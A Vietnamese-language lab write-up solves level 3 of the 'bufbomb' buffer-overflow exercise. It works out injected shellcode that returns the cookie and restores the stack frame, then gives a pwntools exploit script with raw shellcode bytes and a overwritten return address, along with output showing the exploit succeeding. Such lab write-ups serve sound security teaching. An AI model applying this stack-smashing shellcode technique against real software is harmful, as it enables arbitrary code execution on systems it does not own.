# Level 3
## Task
Buffer overflow để hàm getbuf trả về `cookie` tương ứng với `userid` được nhập.  

## Solution
Cách chèn shellcode ở level cũng sẽ tương tự như ở level trước, khác biệt duy nhất là chúng ta phải khôi phục trạng thái của chương trình thay vì để chương trình bị kết thúc sau khi thực thi shellcode.  

Đầu tiên, ta sẽ xác định `return address`.  
![image](https://user-images.githubusercontent.com/44528004/121771564-44868200-cb9a-11eb-9194-4148092d06ce.png)

Từ hình trên, ta thấy rằng câu lệnh sẽ được thực thi sau khi hàm `getbuf` trả về đó là:  

```
0x80139bd7 <test+19>    mov    dword ptr [ebp - 0xc], eax
```  

Vậy `return address = 0x80139bd7`.  

Bên cạnh đó, chúng ta cũng xác định được giá trị của thanh ghi `ebp` của hàm `test` là `0x55683d40`.  

Vậy lúc này, shellcode của chúng ta sẽ như sau:  
```asm
mov    $0x55683d40,%ebp
push   $0x80139bd7
ret
```

Với việc trả về `cookie`, chúng ta sẽ gán giá trị của `cookie` vào thanh ghi `eax`. Từ đó, shellcode sẽ là:  
```asm
mov    $0x8013f158,%eax
mov    (%eax),%eax
mov    $0x55683d40,%ebp
push   $0x80139bd7
ret
```  
> Với `0x8013f158` là địa chỉ của `cookie`.  

Tuy nhiên, với shellcode trên thì chương trình của chúng ta sẽ bị `segmentation fault`. Và khi debug thì ta thấy stack của chương trình trước khi gọi `getbuf` và trong khi thực thi shellcode có sự khác biệt và có lẽ đây là nguyên nhân khiến cho chương trình bị lỗi.  

Stack trước khi gọi `getbuf`:  
```
00:0000│ esp 0x55683d28 (_reserved+1039656) —▸ 0xf7f19dd6 (__memset_sse2_rep+294) ◂— add    ebx, 0x9922a
01:0004│     0x55683d2c (_reserved+1039660) —▸ 0xf7f19e6d (__memset_sse2_rep+445) ◂— add    ebx, 0x48523
02:0008│     0x55683d30 (_reserved+1039664) ◂— xchg   byte ptr [ecx + edx*4], bl /* 0x4d911c86 */
03:000c│     0x55683d34 (_reserved+1039668) —▸ 0x80139f30 (launch+122) ◂— add    esp, 0x10
04:0010│     0x55683d38 (_reserved+1039672) —▸ 0x8013b6cf ◂— push   esp /* 'Type string:' */
05:0014│     0x55683d3c (_reserved+1039676) ◂— 0xf4
06:0018│ ebp 0x55683d40 (_reserved+1039680) —▸ 0x55685fe0 (_reserved+1048544) —▸ 0xffffcbf8 —▸ 0xffffcc38 ◂— 0x0
07:001c│     0x55683d44 (_reserved+1039684) —▸ 0x80139f45 (launch+143) ◂— mov    eax, dword ptr [0x8013f15c]
```  

Stack trong khi thực thi shellcode:  
```
00:0000│ esp 0x55683d28 (_reserved+1039656) —▸ 0xf7f19d00 (__memset_sse2_rep+80) ◂— inc    edx
01:0004│     0x55683d2c (_reserved+1039660) —▸ 0xf7f19e6d (__memset_sse2_rep+445) ◂— add    ebx, 0x48523
02:0008│     0x55683d30 (_reserved+1039664) ◂— xchg   byte ptr [ecx + edx*4], bl /* 0x4d911c86 */
03:000c│     0x55683d34 (_reserved+1039668) —▸ 0x80139f30 (launch+122) ◂— add    esp, 0x10
04:0010│     0x55683d38 (_reserved+1039672) —▸ 0x8013b6cf ◂— push   esp /* 'Type string:' */
05:0014│     0x55683d3c (_reserved+1039676) ◂— 0xf4
06:0018│     0x55683d40 (_reserved+1039680) —▸ 0x55685fe0 (_reserved+1048544) —▸ 0xffffcbf8 —▸ 0xffffcc38 ◂— 0x0
07:001c│     0x55683d44 (_reserved+1039684) —▸ 0x80139f45 (launch+143) ◂— mov    eax, dword ptr [0x8013f15c]
```  

Vậy để có sự đồng nhất về stack, shellcode của chúng ta cần `pop` giá trị `0xf7f19d00` ra khỏi stack và `push` giá trị `0xf7f19dd6` vào stack.  

Từ đó, shellcode của chúng ta sẽ là:  
```asm
pop %eax
movl $0x8013F158,%eax
movl (%eax),%eax
movl $0x55683d40,%ebp
push $0xf7f19dd6
push $0x80139bd7
ret
```  
> Với câu lệnh đầu tiên sẽ `pop` giá trị `0xf7f19d00` vào thanh ghi `eax`, tuy nhiên sau đó `eax` sẽ được gán giá trị của `cookie` nên việc này sẽ không ảnh hưởng tới giá trị trả về.  

#### Script
```python
#! /bin/python3

from pwn import *

context.binary = './bufbomb'

io = process(['./bufbomb', '-u', '09821978'])

shellcode = b'\x58\xb8\x58\xf1\x13\x80\x8b\x00\xbd\x40\x3d\x68\x55\x68\xd6\x9d\xf1\xf7\x68\xd7\x9b\x13\x80\xc3'
exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
exploit_payload += p32(0x55683cf8)

print(f"{exploit_payload = }")
with open("payload.txt", 'wb') as f:
    f.write(exploit_payload)

io.sendline(exploit_payload)
io.interactive()
```  

Chạy script.  
```
└─$ python3 level3.py
[*] '/mnt/f/src-team-1/bufbomb'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './bufbomb': pid 227
exploit_payload = b'X\xb8X\xf1\x13\x80\x8b\x00\xbd@=hUh\xd6\x9d\xf1\xf7h\xd7\x9b\x13\x80\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf8<hU'
[*] Switching to interactive mode
[*] Process './bufbomb' stopped with exit code 0 (pid 227)
Userid: 09821978
Cookie: 0x31f21393
Type string:Boom!: getbuf returned 0x31f21393
VALID
NICE JOB!
[*] Got EOF while reading in interactive
```  
> Chính xác!
